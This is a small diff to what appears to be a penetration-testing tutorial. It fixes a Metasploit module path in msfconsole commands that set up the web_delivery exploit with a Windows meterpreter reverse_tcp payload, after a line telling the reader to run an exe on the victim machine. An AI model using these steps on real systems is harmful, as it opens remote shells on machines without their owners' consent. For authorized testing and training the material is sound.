@@ -29,7 +29,7 @@ Run the exe in victim machine and wait for connection.
 
 In msfconsole,
 ```
-use exploit/multiscript/web_delivery
+use exploit/multi/script/web_delivery
 set target 2
 set payload windows/x64/meterpreter/reverse_tcp
 ```
